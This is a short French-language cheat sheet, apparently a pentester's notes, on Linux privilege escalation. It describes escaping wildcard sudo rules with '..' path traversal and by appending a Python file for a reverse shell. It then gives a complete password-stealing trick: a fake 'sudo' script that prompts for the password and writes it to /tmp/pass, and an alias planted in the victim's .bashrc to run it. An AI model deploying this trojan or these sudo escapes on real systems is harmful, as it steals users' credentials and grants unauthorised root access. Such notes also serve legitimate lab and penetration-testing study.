# Avec sudo -l
## pour un [folder]/*
Possible de faire un .. pour contourner et aller dans les autres dossiers
```bash
cat /home/user/folder/../../file
```

## pour un fichier en py suivi de *
Possible de concaténer un autre .py à la suite (pour faire un reverse shell par exemple)

# Récupérer le mot de passe d'un compte sudo
Créer le script suivant en le nommant `sudo`
```bash
#!/bin/bash 
echo -n "Password: "; read -s password; echo $password >> /tmp/pass; echo
```

Faire en sorte que le script soit executable
```bash
chmod +x sudo
```

Créer ou remplacer l'alias dans le .bashrc de l'utilisateur auquel on veut récupérer le mot de passe
```bash
alias sudo='/home/user/sudo'
```
